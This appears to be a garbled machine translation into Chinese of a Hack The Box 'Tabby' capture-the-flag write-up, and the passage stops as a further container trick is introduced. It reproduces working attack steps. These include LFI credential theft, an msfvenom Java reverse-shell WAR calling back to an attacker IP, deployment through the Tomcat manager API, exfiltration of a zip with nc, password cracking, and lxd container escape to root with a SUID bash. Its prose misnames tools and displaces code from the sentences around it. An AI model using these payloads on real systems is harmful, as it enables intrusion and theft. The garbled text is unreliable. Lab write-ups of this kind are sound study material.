网站中找到本地文件包含（LFI）
上传 WAR 文件、获取执行和 shell。
我将破解备份zip存档上的密码，
lxd 提权，
# 高温透射率：虎斑

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftabby-cover.) 

Tabby是一个精心设计的简单关卡框，需要在网站中找到本地文件包含（LFI）才能泄漏同一主机上Tomcat服务器的凭据。我获得访问权限的用户只能访问命令行管理器 API，而不能访问 GUI，但我可以使用它来上传 WAR 文件、获取执行和 shell。我将破解备份zip存档上的密码，然后使用相同的密码更改为下一个用户。该用户是 lxd 组的成员，该组允许他们启动容器。我之前已经展示了这个根，但这次我将包括一个非常整洁的m0noc技巧，可以节省几个步骤。在“超越根”中，我将拉开 WAR 文件并显示其中的实际内容。

## 箱子信息

名字

[斑猫](https://www.hackthebox.eu/home/machines/profile/259) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-tabby.png) 

发行日期

[20 6月 2020](https://twitter.com/hackthebox_eu/status/1273989174203482112)

停用日期

07 11月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftabby-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftabby-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 01小时 15分 25秒。[![多里迪恩](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F310032)](https://www.hackthebox.eu/home/users/profile/310032)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 15分14秒[![多里迪恩](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F310032)](https://www.hackthebox.eu/home/users/profile/310032)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F1190)](https://www.hackthebox.eu/home/users/profile/1190)-

## 侦察

### n地图

`nmap`找到三个开放的 TCP 端口，SSH （22），HTTP 阿帕奇 （80） 和 HTTP 雄猫 （8080）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.194
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 15:38 EDT
    Nmap scan report for 10.10.10.194
    Host is up (0.017s latency).
    Not shown: 65532 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8080/tcp open  http-proxy
    
    Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
    
    root@kali# nmap -p 80,8080,22 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.194
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 15:38 EDT
    Nmap scan report for 10.10.10.194
    Host is up (0.011s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Mega Hosting
    8080/tcp open  http    Apache Tomcat
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-title: Apache Tomcat
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.30 seconds
    

基于[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)和[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)版本，主机可能运行的是Ubuntu 20.04格鲁维。考虑到盒子的名字，雄猫并不奇怪。

### 网站 - TCP 80

#### 网站

该网站是一家托管公司：

[![image-20200622154515612](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622154515612.png)](https://0xdf.gitlab.io/img/image-20200622154515612.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20200622154515612.png)

页面上的大多数链接都已失效，但有几个链接指向诸如 .`http://megahosting.htb/news.php?file=statement`

我将添加到我的文件中：`megahosting.htb``/etc/hosts`

    10.10.10.194 megahosting.htb
    

该网站是相同的，但现在链接可以正常工作。

#### 新闻.php

新闻链接转到 ，其中加载有关违规的声明，以及新闻工具如何不再存在：`http://megahosting.htb/news.php?file=statement`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622161504359.png) 

#### 目录暴力破解

我将针对该网站运行，并包括，因为我知道该网站是PHP：`gobuster``-x php`

    root@kali# gobuster dir -u http://10.10.10.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-
    med
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.194
    [+] Threads:        40
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php
    [+] Timeout:        10s
    ===============================================================
    2020/06/22 15:44:44 Starting gobuster
    ===============================================================
    /news.php (Status: 200)
    /index.php (Status: 200)
    /files (Status: 301)
    /assets (Status: 301)
    /server-status (Status: 403)
    ===============================================================
    2020/06/22 15:47:52 Finished
    ===============================================================
    

这里没什么新东西。

### 雄猫 - TCP 8080

8080上的页面是默认的[阿帕奇雄猫](http://tomcat.apache.org/)演示页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622170225550.png) 

该页面并非完全没有价值。它提供指向管理器 Web 应用和主机管理器 Web 应用的链接。两者都在访问时弹出基本身份验证提示。它还提供了有关定义用户的位置以及访问各种Web应用程序所需的角色的提示。

## 贝壳 饰 雄猫

### 获取雄猫证书

#### 识别生命周期设置

中的 URL 可疑 - 参数表明它包含一个文件。我将通过访问以下方法来检查本地文件包含（LFI）：`news.php``file``http://megahosting.htb/news.php?file=../../../../etc/passwd`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622170108801.png) 

我肯定有一个本地文件包括在这里。

#### 查找雄猫用户.xml

TCP 8080 根部的雄猫页面说：

> 用户在 中定义。`/etc/tomcat9/tomcat-users.xml`

这似乎是一个显而易见的地方。但什么也没回来：

    root@kali# curl http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml
    

在猜测和谷歌搜索了一下之后，我刚刚安装了Tomcat与.然后我过去常常寻找，并得到两个结果：`apt install tomcat9``find``tomcat-users.xml`

    root@kali# find / -name tomcat-users.xml
    /usr/share/tomcat9/etc/tomcat-users.xml
    /etc/tomcat9/tomcat-users.xml
    

采取新的路径到 Tabby 找到该文件（在 Firefox 视图源中显示得很漂亮）：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622203509614.png) 

我有一个用户，tomcat，密码为“$ 3cureP4s5w0rd123！”，以及角色和.`admin-gui``manager-script`

### 在主机管理器中失败

管理器 web 应用和主机管理器 Web 应用都有来自默认 Tomcat 页面的链接。我能够从该页面确认这一点：

> 注意：出于安全原因，管理器 Web 应用程序仅限具有“管理器-gui”角色的用户使用。主机管理器 Web 应用仅限于具有“管理员-gui”角色的用户。用户在 中定义。`/etc/tomcat9/tomcat-users.xml`

用户 tomcat 有 ，但没有 ，这意味着我无法访问管理器 web 应用程序：`admin-gui``manager-gui`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622204040089.png) 

但我可以访问主机管理器网络应用程序：

[![image-20200622204142330](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622204142330.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20200622204142330.png)

此页面用于添加虚拟主机并为其分配应用程序。我尝试了一些都失败的事情：

*   [此页面](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)建议使用应用基数的主机上 SMB 共享的 UNC 路径来加载恶意应用，但这不起作用。我怀疑它在博客文章中有效，因为雄猫托管在Windows机器上。对我来说，它试图工作的道路是没有意义的：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622204425956.png) 

*   我尝试将PHP代码添加到各个字段。我真的没想到它会在Tomcat服务器上运行（它没有）。它甚至没有正确通过，因为它在每个空格之后添加：`,`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622204602500.png) 

*   我想也许我可以保存带有PHP的配置，然后使用TCP 80中的LFI访问它，但是当我试图保存配置时，它失败了：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622204643977.png) 

### 基于文本的管理器

雄猫用户确实有另一个权限，.这是为了允许访问位于 的基于文本的 Web 服务。这里有一[个命令列表](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands)。`manager-script``/manager/text`

我可以用它来测试它，它的工作原理：`list`

    root@kali# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
    OK - Listed applications for virtual host [localhost]
    /:running:0:ROOT
    /examples:running:0:/usr/share/tomcat9-examples/examples
    /host-manager:running:0:/usr/share/tomcat9-admin/host-manager
    /manager:running:0:/usr/share/tomcat9-admin/manager
    /docs:running:0:/usr/share/tomcat9-docs/docs
    

现在我可以访问管理器（即使不是通过GUI）

### 部署恶意战争

#### 生成有效负载

通过访问 Tomcat 管理器，我可以像在 [Jerry](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html#exploiting-tomcat) 中一样继续进行恶意上传，但在这里，我将使用基于文本的管理器应用程序来部署它。我将生成一个有效载荷来获得一个简单的反向外壳：`.war``msfvenom`

    root@kali# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=443 -f war -o rev.10.10.14.18-443.war
    Payload size: 13398 bytes
    Final size of war file: 13398 bytes
    Saved as: rev.10.10.14.18-443.war
    

#### 上传负载

现在，我将使用 来发送有效负载。我需要为它提供应用程序路径（url），并使用 HTTP PUT 请求发送有效负载。在 中，我将使用 或 来表示 PUT 请求：`curl``curl``-T``--upload-file`

>        -T, --upload-file <file>
>               This transfers the specified local file to the remote URL. If there is no file part in the specified URL, curl will append the local file name.  NOTE  that  you
>               must  use  a  trailing / on the last directory to really prove to Curl that there is no file name or curl will think that your last directory name is the remote
>               file name to use. That will most likely cause the upload operation to fail. If this is used on an HTTP(S) server, the PUT command will be used.
>     

我将使用以下命令部署有效负载：

    root@kali# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/0xdf --upload-file rev.10.10.14.18-443.war 
    OK - Deployed application at context path [/0xdf]
    

那是：

*   `-u 'tomcat:$3cureP4s5w0rd123!'`\- 信誉
*   `/manager/text/deploy`\- 基于文本的命令路径`deploy`
*   `?path=/0xdf`\- 我希望应用程序所在的路径
*   `--upload-file rev.10.10.14.18-443.war`\- 战争文件上传与 HTTP 输出

结果表明它有效。我将启动 ，然后使用 触发它。我用外壳恢复了连接：`nc``curl http://10.10.10.194:8080/0xdf`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.194.
    Ncat: Connection from 10.10.10.194:37000.
    id
    uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
    

### 外壳升级

我将升级到 PTY，使用制表符完成键和箭头键：

    python3 -c 'import pty;pty.spawn("bash")'
    tomcat@tabby:/var/lib/tomcat9$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    root@kali# stty raw -echo; fg
    nc -lnvp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    tomcat@tabby:/var/lib/tomcat9$ 
    

## 私人： 雄猫 –>灰

### 列举

在 Web 目录中，（包含 LFI 漏洞）应该从该目录加载文件。`/var/www/html``news.php``files`

    <?php
    $file = $_GET['file'];
    $fh = fopen("files/$file","r");
    while ($line = fgets($fh)) {
      echo($line);
    }
    fclose($fh);
    ?>
    

在 中，有 一个 ，但也有一个由 ash 拥有的备份文件：`files``statement`

    tomcat@tabby:/var/www/html/files$ ls -l                                                  
    total 28                                    
    -rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip                             
    drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive                                         
    drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
    -rw-r--r-- 1 root root 6507 Jun 16 11:25 statement
    

### 访问存档

#### 埃克菲尔

我将其复制到并尝试，但它需要密码。`161612020_backup.zip``/dev/shm``unzip`

我把它压缩回我自己的机器，在我的机器上启动，然后运行：`nc`

    tomcat@tabby:/var/www/html/files$ md5sum 16162020_backup.zip                             
    f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip 
    tomcat@tabby:/var/www/html/files$ cat 16162020_backup.zip | nc 10.10.14.18 443
    

我还得到了哈希值，所以我可以确保我得到的文件没有损坏。回到我的主机，文件进来，哈希匹配：

    root@kali# nc -lnvp 443 > 16162020_backup.zip
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.194.
    Ncat: Connection from 10.10.10.194:37002.
    ^C
    root@kali# md5sum 16162020_backup.zip 
    f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip
    

#### 裂纹

要破解密码，我将使用创建一个哈希值：`zip2john`

    root@kali# zip2john 16162020_backup.zip > 16162020_backup.zip.john
    16162020_backup.zip/var/www/html/assets/ is not encrypted!  
    ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type                                                                     
    ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
    ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
    ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
    ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F                                            
    ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E                                             
    ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
    NOTE: It is assumed that all files in each archive have the same password.
    If that is not the case, the hash may be uncrackable. To avoid this, use
    option -o to pick a file at a time.
    

然后我可以把它传递给它，它立即断裂：`john``rockyou`

    root@kali# john 16162020_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Will run 3 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    admin@it         (16162020_backup.zip)
    1g 0:00:00:00 DONE (2020-06-22 21:21) 1.030g/s 10679Kp/s 10679Kc/s 10679KC/s adorovospessoal..adilizrar
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    

我也可以使用.首先，我将在输出上添加一个：`hashcat``cut``zip2john`

    root@kali# zip2john 16162020_backup.zip | cut -d: -f2 > 16162020_backup.zip.hash
    ...[snip]...
    

哈希与[示例哈希页面中](https://hashcat.net/wiki/doku.php?id=example_hashes)的格式 17225 匹配。该哈希在我的Kali实例的版本中并不知道，但它在mxrch的[penglab](https://github.com/rvrsh3ll/penglab)中起作用（我的笔记本略有修改）：`hashcat`

[![image-20200622213307729](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200622213307729.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20200622213307729.png)

### 苏

在浏览档案时，我有点困惑。里面没有任何有用的东西。然后我突然想到，灰烬可能重用了他的密码。我运行了 ，它的工作原理：`su`

    tomcat@tabby:/var/www/html$ su - ash
    Password: 
    ash@tabby:~$
    

从这里我可以抓住：`user.txt`

    ash@tabby:~$ cat user.txt
    a4a96fdb************************
    

## Priv： 灰分 –>根

### 列举

我基本上在每个Linux外壳中运行的第一个命令是。它不仅显示 shell 的运行身份，还显示用户分组：`id`

    ash@tabby:~$ id
    uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
    

在这种情况下，很有趣（它允许我读取日志文件），但我立即被所吸引。这个群体是一条无意的（最终修补的）路径，在[恶作剧](https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#option-3---lxc-patched)和[晦涩](https://0xdf.gitlab.io/2020/05/09/htb-obscurity.html#patched-path-4-lxd)中都扎根，但这里实际上是预期的路径。自从最初解决以来，我遇到了一种非常巧妙的方法，可以更好地做到这一点，所以我将展示标准方法和升级。`adm``lxd`

### 断续器开发

基本思想是，我可以创建一个容器，并将 Tabby 上的根文件系统挂载到容器中，然后我就可以完全访问它。

主机上当前没有容器：

    ash@tabby:/tmp$ lxc list                                                                                                                                                           
    +------+-------+------+------+------+-----------+                                        
    | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |    
    +------+-------+------+------+------+-----------+ 
    

我需要给虎斑带一个容器。我将通过在我的目录中运行来获取 [LXD 阿尔皮纳 Linux 映像生成器](https://github.com/saghul/lxd-alpine-builder)。此工具将创建一个阿尔卑斯 Linux 容器映像。我可以用操作系统的味道来做到这一点，但是Alpine很好，因为它真的很精简和小。我将进入该目录并运行构建器：`git clone [path to repo]``/opt`

    root@kali:/opt/lxd-alpine-builder# ./build-alpine
    Determining the latest release... v3.12                                                  
    Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
    Downloading alpine-mirrors-3.5.10-r0.apk
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    Downloading alpine-keys-2.2-r0.apk
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'   
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'      
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    Downloading apk-tools-static-2.10.5-r1.apk                                               
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
    alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK                
    Verified OK                                                                              
    Selecting mirror http://dl-5.alpinelinux.org/alpine/v3.12/main         
    fetch http://dl-5.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
    (1/19) Installing musl (1.1.24-r9)                                                       
    (2/19) Installing busybox (1.31.1-r19)                                                   
    Executing busybox-1.31.1-r19.post-install                                                
    (3/19) Installing alpine-baselayout (3.2.0-r7)                         
    Executing alpine-baselayout-3.2.0-r7.pre-install                       
    Executing alpine-baselayout-3.2.0-r7.post-install                      
    (4/19) Installing openrc (0.42.1-r10)                                                    
    Executing openrc-0.42.1-r10.post-install                                                 
    (5/19) Installing alpine-conf (3.9.0-r1)                                                 
    (6/19) Installing libcrypto1.1 (1.1.1g-r0)                                               
    (7/19) Installing libssl1.1 (1.1.1g-r0)                                                  
    (8/19) Installing ca-certificates-bundle (20191127-r4)                 
    (9/19) Installing libtls-standalone (2.9.1-r1)                         
    (10/19) Installing ssl_client (1.31.1-r19)                                               
    (11/19) Installing zlib (1.2.11-r3)                                                      
    (12/19) Installing apk-tools (2.10.5-r1)                                                 
    (13/19) Installing busybox-suid (1.31.1-r19)                           
    (14/19) Installing busybox-initscripts (3.2-r2)        
    Executing busybox-initscripts-3.2-r2.post-install                                        
    (15/19) Installing scanelf (1.2.6-r0)                                                    
    (16/19) Installing musl-utils (1.1.24-r9)                                                
    (17/19) Installing libc-utils (0.7.2-r3)                                                 
    (18/19) Installing alpine-keys (2.2-r0)                                                  
    (19/19) Installing alpine-base (3.12.0-r0)                                               
    Executing busybox-1.31.1-r19.trigger                                                     
    OK: 8 MiB in 19 packages 
    

完成后，有一个软件包包含制作Alpine Linux容器所需的文件。`.tar.gz`

我将通过在我的主机上运行Python Web服务器（）然后从Tabby运行来将其上传到Tabby：`python3 -m http.server 80``wget`

    ash@tabby:/dev/shm$ wget 10.10.14.18/alpine-v3.12-x86_64-20200623_0622.tar.gz
    --2020-06-23 12:17:39--  http://10.10.14.18/alpine-v3.12-x86_64-20200623_0622.tar.gz
    Connecting to 10.10.14.18:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 3219042 (3.1M) [application/gzip]
    Saving to: ‘alpine-v3.12-x86_64-20200623_0622.tar.gz’
    
    alpine-v3.12-x86_64 100%[===================>]   3.07M  9.23MB/s    in 0.3s    
    
    2020-06-23 12:17:39 (9.23 MB/s) - ‘alpine-v3.12-x86_64-20200623_0622.tar.gz’ saved [3219042/3219042]
    

接下来，我将图像导入到：`lxc`

    ash@tabby:/dev/shm$ lxc image import /dev/shm/alpine-v3.12-x86_64-20200623_0622.tar.gz --alias 0xdf-image
    If this is your first time running LXD on this machine, you should also run: lxd init
    To start your first instance, try: lxc launch ubuntu:18.04
    
    Image imported with fingerprint: 8acac69131bcf6667369fa31360204fd255275b4bee3b7f98a64c6c23cbe4e5f
    

如消息所示，我需要运行 。我可以接受所有的默认值：`lxd init`

    ash@tabby:/dev/shm$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: 
    Do you want to configure a new storage pool? (yes/no) [default=yes]: 
    Name of the new storage pool [default=default]: Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: Create a new BTRFS pool? (yes/no) [default=yes]: Would you like to use an existing block device? (yes/no) [default=no]: 
    Size in GB of the new loop device (1GB minimum) [default=15GB]: 
    Would you like to connect to a MAAS server? (yes/no) [default=no]: 
    Would you like to create a new local network bridge? (yes/no) [default=yes]: 
    What should the new bridge be called? [default=lxdbr0]: 
    What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    Would you like LXD to be available over the network? (yes/no) [default=no]: 
    Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
    Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
    

现在，我将使用以下选项从映像创建一个容器：

*   `init`\- 要采取的行动，启动一个容器
*   `0xdf-image`\- 图像开始
*   `container-0xdf`\- 正在运行的容器的别名
*   `-c security.privileged=true`\- 默认情况下，容器作为非根 UID 运行;这将以 root 身份运行容器，使其能够以 root 身份访问主机文件系统

    ash@tabby:/dev/shm$ lxc init 0xdf-image container-0xdf -c security.privileged=true
    Creating container-0xdf
    

我还将主机文件系统的一部分挂载到容器中。这对于在两者之间拥有共享文件夹很有用。我将通过挂载主机系统根目录来滥用它：

    ash@tabby:/dev/shm$ lxc config device add container-0xdf device-0xdf disk source=/ path=/mnt/root
    Device device-0xdf added to container-0xdf
    

现在容器已设置并准备就绪，只是没有运行：

    ash@tabby:/dev/shm$ lxc list               
    +----------------+---------+------+------+-----------+-----------+
    |      NAME      |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
    +----------------+---------+------+------+-----------+-----------+
    | container-0xdf | STOPPED |      |      | CONTAINER | 0         |
    +----------------+---------+------+------+-----------+-----------+
    

我将启动容器：

    ash@tabby:/dev/shm$ lxc start container-0xdf
    ash@tabby:/dev/shm$ lxc list                
    +----------------+---------+----------------------+-----------------------------------------------+-----------+-----------+
    |      NAME      |  STATE  |         IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
    +----------------+---------+----------------------+-----------------------------------------------+-----------+-----------+
    | container-0xdf | RUNNING | 10.227.81.251 (eth0) | fd42:dc54:f291:9c6d:216:3eff:fe84:fe35 (eth0) | CONTAINER | 0         |
    +----------------+---------+----------------------+-----------------------------------------------+-----------+-----------+
    

以下命令返回容器内的根 shell：`lxc exec`

    ash@tabby:/dev/shm$ lxc exec container-0xdf /bin/sh
    ~ # id
    uid=0(root) gid=0(root)
    

外壳位于容器内：

    ~ # cat /etc/hostname 
    container-0xdf
    

但是进入挂载部分，我找到了主机文件系统：

    ~ # cd /mnt/root/
    /mnt/root # ls
    bin         dev         lib         libx32      mnt         root        snap        sys         var
    boot        etc         lib32       lost+found  opt         run         srv         tmp
    cdrom       home        lib64       media       proc        sbin        swap.img    usr
    /mnt/root # cat etc/hostname 
    tabby
    

我可以抓住 ：`root.txt`

    /mnt/root # cd root/
    /mnt/root/root # cat root.txt
    cccf5325************************
    

在主机上具有完整的文件系统访问权限时，有很多方法可以获取 shell。我可以编辑（如在[老师](https://0xdf.gitlab.io/2019/04/20/htb-teacher.html#etcpasswd)或[爆米花](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html#manual-exploit)中），编辑文件（[如轻量级或](https://0xdf.gitlab.io/2019/05/11/htb-lightweight.html#root-shell)[周日](https://0xdf.gitlab.io/2018/09/29/htb-sunday.html#overwrite-sudoers)）。我之前没有展示过的另一个简单的技巧是设置为SUID，以便它以root身份运行：`/etc/passwd``/etc/sudoers``bash`

    /mnt/root/usr/bin # ls -l bash
    -rwxr-xr-x    1 root     root       1183448 Feb 25 12:03 bash
    /mnt/root/usr/bin # chmod 4755 bash
    /mnt/root/usr/bin # ls -l bash
    -rwsr-xr-x    1 root     root       1183448 Feb 25 12:03 bash
    

请注意，第四个字符从 更改为 。`x``s`

现在我可以退出容器并运行以获取根外壳（注意有效的uid，）：`bash -p``euid`

    ash@tabby:/dev/shm$ bash -p
    bash-5.0# id
    uid=1000(ash) gid=1000(ash) euid=0(root) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
    

### 更好的 LXC 根

m0noc写了[这篇惊人的文章](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)，关于一个更好的方法来进行LXC利用。在上一节中，我将一个容器引入系统并运行它。我试图使用最小的容器（Apline），但它仍然是一个完整的文件系统。m0noc考虑从映像中删除尽可能多的内容，它可以依赖从主机操作系统映射文件。最后，他将必要的容器减少到一个656字节的base64编码字符串。

现在，我可以将此字符串回显为并保存为文件，从而创建656字节的图像：`base64 -d`

